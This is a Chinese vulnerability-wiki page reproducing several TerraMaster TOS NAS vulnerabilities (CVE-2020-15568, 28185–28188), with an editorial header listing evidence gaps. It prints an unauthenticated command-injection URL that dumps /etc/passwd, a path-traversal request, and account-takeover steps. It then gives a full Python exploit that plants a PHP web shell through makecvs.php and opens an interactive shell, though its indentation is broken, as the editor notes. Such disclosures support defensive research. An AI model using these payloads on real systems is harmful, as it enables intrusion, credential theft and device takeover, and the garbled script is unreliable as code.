---
cve: "CVE-2020-28188; CVE-2020-28187; CVE-2020-28186; CVE-2020-28185; CVE-2020-15568"
title: "TerraMaster TOS 多个漏洞复现"
product: "TerraMaster TOS"
record_type: "roundup"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "active"
primary_identifiers: "CVE-2020-28188; CVE-2020-28187; CVE-2020-28186; CVE-2020-28185; CVE-2020-15568"
referenced_identifiers: ""
identifier_role: "primary"
source_url: "https://mp.weixin.qq.com/s/GAOliqwEqXOsQ4LeNDCQaw"
source_status: "recorded"
prerequisites: "原文未完整说明身份权限、部署配置和可达性；不能假定匿名、默认开启或所有版本适用。"
side_effects: "含资源消耗、延时或崩溃验证：可能影响服务可用性；限制请求次数、并发与超时，保留无攻击负载的对照结果。"
id: "vw-6c329657131d01cbecf34345"
entity_id: "ve-6c329657131d01cbecf34345"
schema_version: "1"
---

# TerraMaster TOS 多个漏洞复现

<!-- vulwiki-editorial:start -->
## 校订与适用边界


### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 元数据只28188，另15568/28185/28186/28187缺
- 影响范围只产品名无各版本
- Python缩进破坏，response在函数外未定义，try后while不缩进
- 关键重置密码请求和用户枚举仅截图
- 账号重置/写php文件有实际修改副作用，删除未验证
- 28188是Event命令注入而非文件上传根因
- 保留IHTeam原始分析并清营销

### 操作风险与资料使用

- 含资源消耗、延时或崩溃验证：可能影响服务可用性；限制请求次数、并发与超时，保留无攻击负载的对照结果。

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/GAOliqwEqXOsQ4LeNDCQaw)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el5PaBkbJ8nfmXVfbQx819qWWENXGA38BxibTAnuZz5ujFRic5ckEltsvWaKVRqOdVO88GrKT6I0NTTQ/640?wx_fmt=gif)

**![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7f0qibYGLgIyO0zpTSeV1I6m1WibjS1ggK9xf8lYM44SK40O6uRLTOAtiaM0xYOqZicJ2oDdiaWFianIjQ/640?wx_fmt=png)**

**一****：漏洞描述🐑**

```
TerraMaster TOS RCE CVE-2020-28188
TerraMaster TOS 任意文件读取漏洞 CVE-2020-28187
TerraMaster TOS 任意账号密码修改漏洞 CVE-2020-28186
TerraMaster TOS 用户枚举漏洞 CVE-2020-28185
TerraMaster TOS exportUser.php 远程命令执行
```

**二:  漏洞影响🐇**

**TerraMaster TOS**

**三:  漏洞复现🐋**

```
TerraMaster TOS exportUser.php 远程命令执行 CVE-2020-15568
```

出现漏洞的文件 **_exportUser.php_**

```
<?php
include_once "./app.php"; // [1] autoload classes
class CSV_Writer{
        ...
    }
    $type = $_GET['type'];
    $csv = new CSV_Writer();
if($type == 1){
        $P = new person();
        $data = $P->export_user($_GET['data']);
        $csv->exportUser($data);
    } else if($type == 2) {
        $P = new person();
        $data = $P->export_userGroup($_GET['data']);
        $csv->exportUsergroup($data);
    } else { // [2] type value is bigger than 2
//xlsx通用下载
        $type = 0;
        $class = $_GET['cla'];
        $fun = $_GET['func'];
        $opt = $_GET['opt'];
        $E = new $class();
        $data = $E->$fun($opt); // [3] vulnerable code call
        $csv->exportExcel( $data['title'], $data['data'], $data['name'], $data['save'], $data['down']);
    }
?>
```

**在其他文件的代码检查期间，也发现有一种方法可以利用 TOS 软件中预先存在的类来利用此问题。位于 **include/class/application.class.php** 中的 PHP 类是在运行 TOS 软件的设备上执行命令的最佳人选。**  

**由于 _exportUser.php_ 没有身份验证控件，因此未经身份验证的攻击者有可能通过提供以下值作为 HTTP GET 参数来实现代码执行。**

```
http://xxx.xxx.xxx.xxx/include/exportUser.php?type=3&cla=application&func=_exec&opt=(cat%20/etc/passwd)>pq.txt
```

**返回 200 后再次访问**

```
http://xxx.xxx.xxx.xxx/include/pq.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6cEgwtboqU6UBiazhGbsaEhCZJ61uVD9RPbSyhIiatmaFvbqgkICelfMBJPKkgzPCnpuB3W3bEzarA/640?wx_fmt=png)

```
TerraMaster TOS 用户枚举漏洞 CVE-2020-28185
```

**漏洞点来源于找回密码的用户存在校验**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6cEgwtboqU6UBiazhGbsaEhDwoHntoneY5stnm1laTqZf3d2uPibvZnHSkMBiaf3Jje55mnTRcBoxiaw/640?wx_fmt=png)

**输入用户名 admin 点击确定，查看 Burp 捕获的包**

**其中有一个请求包用于确认用户 admin 是否存在**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6cEgwtboqU6UBiazhGbsaEhO6sWFcuGnhdh0DpDNEbj0LiaGuTJYSBcSAsGAuQ9wrcARDB3MEy9ezA/640?wx_fmt=png)

**存在则返回用户的邮箱信息**

```
TerraMaster TOS 任意账号密码修改漏洞 CVE-2020-28186
```

**首先需要知道已知用户名，可以参考 TerraMaster TOS 用户枚举漏洞 CVE-2020-28185 获取已知的用户名**

**重置页面输入获取的账号和邮箱**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6cEgwtboqU6UBiazhGbsaEhsyME9ib3E3UZIgEJwdryHH7QXXefzyicSnjJ7Aiaibj9OSBUKCbXS5ZI7Q/640?wx_fmt=png)

**点击确定，抓包更换邮箱接收验证码**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6cEgwtboqU6UBiazhGbsaEhT0ichW2s2PRQCD9uhBx2SdzlmNm8dbSMpmrD68nxjfdPiaEDmON5UB1g/640?wx_fmt=png)

**通过接收的验证码即可更换账号密码登录后台**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6cEgwtboqU6UBiazhGbsaEhH62EHlAKlrAMRaSI1iaw0XKm5qKKnianCNYBdfozshhficfwGokwF8mzA/640?wx_fmt=png)

```
TerraMaster TOS 后台任意文件读取漏洞 CVE-2020-28187
```

**登陆后访问，验证漏洞的 POC 为**  

```
/tos/index.php?editor/fileGet&filename=../../../../../../etc/passwd
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6cEgwtboqU6UBiazhGbsaEhWAEdGY8zzhQS5oOPaBBv87WbnD4NEGt5HnBSyTOftYJaEYxxax21BQ/640?wx_fmt=png)

```
TerraMaster TOS RCE CVE-2020-28188
```

**存在漏洞的为 **/include/makecvs.php** 中的 Event 参数**

**使用 EXP 文件上传并执行命令**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6cEgwtboqU6UBiazhGbsaEhuOA6KcxjAfRx02KibOYibornPMibQIxaVKCsfDcsUGCPia4HHp1ExHJNvw/640?wx_fmt=png)

 ****四:  漏洞 POC🦉****

```
# Exploit Title: TerraMaster TOS 4.2.06 - RCE (Unauthenticated)
# Date: 12/12/2020
# Exploit Author: IHTeam
# Full Write-up: https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/
# Vendor Homepage: https://www.terra-master.com/
# Version: <= 4.2.06
# Tested on: 4.1.30, 4.2.06
#!/usr/bin/env python3
import argparse
import requests
import time
import sys
import urllib.parse
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
parser = argparse.ArgumentParser(description="TerraMaster TOS <= 4.2.06 Unauth RCE")
parser.add_argument('--url', action='store', dest='url', required=True, help="Full URL and port e.g.: http://192.168.1.111:8081/")
args = parser.parse_args()
url = args.url
headers = {'User-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36'}
epoch_time = int(time.time())
shell_filename = "debug"+str(epoch_time)+".php"
def check_endpoint(url, headers):
  response = requests.get(url+'/version', headers=headers, verify=False)
if response.status_code == 200:
    print("[+] TerraMaster TOS version: ", str(response.content))
else:
    print("\n[-] TerraMaster TOS response code: ", response.status_code)
    sys.exit()
def upload_shell(url, headers, shell_filename):
  payload = "http|echo \"<?php echo(passthru(\\$_GET['cmd']));?>\" >> /usr/www/"+shell_filename+" && chmod +x /usr/www/"+shell_filename+"||"
  payload = urllib.parse.quote(payload, safe='')
  print("[/] Uploading shell...")
  response = requests.get(url+'/include/makecvs.php?Event='+payload, headers=headers, verify=False)
  time.sleep(1)
  response = requests.get(url+'/'+shell_filename+'?cmd=cat /etc/passwd', headers=headers, verify=False)
if ('root:' in str(response.content, 'utf-8')):
    print("[+] Upload succeeded")
else:
    print("\n[-] Error uploading shell: ", response.content)
    sys.exit()
def interactive_shell(url, headers, shell_filename, cmd):
  response = requests.get(url+'/'+shell_filename+'?cmd='+urllib.parse.quote(cmd, safe=''), headers=headers, verify=False)
  print(str(response.text)+"\n")
def delete_shell(url, headers, shell_filename):
  delcmd = "rm /usr/www/"+shell_filename
  response = requests.get(url+'/'+shell_filename+'?cmd='+urllib.parse.quote(delcmd, safe=''), headers=headers, verify=False)
  print("\n[+] Shell deleted")
upload_shell(url, headers, shell_filename)
try:
while True:
    cmd = input("# ")
    interactive_shell(url, headers, shell_filename, cmd)
except:
  delete_shell(url, headers, shell_filename)
```

**参考链接  
**

**https://mp.weixin.qq.com/s/w7gF4V9TMbYeknWaYNXctA**

 ****五:  关于文库🦉****

 **在线文库：**

**http://wiki.peiqi.tech**

 **Github：**

**https://github.com/PeiQi0/PeiQi-WIKI-POC**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4cpD8uQPH24EjA7YPtyZEP33zgJyPgfbMpTJGFD7wyuvYbicc1ia7JT4O3r3E99JBicWJIvcL8U385Q/640?wx_fmt=png)

最后
--

> 下面就是文库的公众号啦，更新的文章都会在第一时间推送在交流群和公众号
> 
> 想要加入交流群的师傅公众号点击交流群加我拉你啦~
> 
> 别忘了 Github 下载完给个小星星⭐

公众号

**同时知识星球也开放运营啦，希望师傅们支持支持啦🐟**

**知识星球里会持续发布一些漏洞公开信息和技术文章~**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7iafXcY0OcGbVuXIcjiaBXZuHPQeSEAhRof2olkAM9ZghicpNv0p8rRbtNCZJL4t82g15Va8iahlCWeg/640?wx_fmt=png)

**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**

**PeiQi 文库 拥有对此文章的修改和解释权如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。**

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
